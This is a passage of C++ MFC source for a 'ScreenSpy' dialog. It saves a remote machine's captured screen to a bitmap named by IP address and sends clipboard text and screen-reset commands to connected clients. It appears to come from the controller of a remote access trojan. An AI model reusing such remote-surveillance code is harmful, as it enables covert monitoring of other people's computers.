		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
	}
	break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
	CDialog::OnSysCommand(nID, lParam);
}


bool CScreenSpyDlg::SaveSnapshot(void)
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "位图文件(*.bmp)|*.bmp|", this);
	if (dlg.DoModal() != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败");
		return false;
	}

	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);

	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();

	return true;

}
void CScreenSpyDlg::SendLocalClipboard(void)
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}


void CScreenSpyDlg::SendResetAlgorithm(UINT nAlgorithm)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_ALGORITHM_RESET;
	bBuff[1] = nAlgorithm;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}


void CScreenSpyDlg::SendResetScreen(int nBitCount)
{

	m_nBitCount = nBitCount;

	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET;
	bBuff[1] = m_nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}
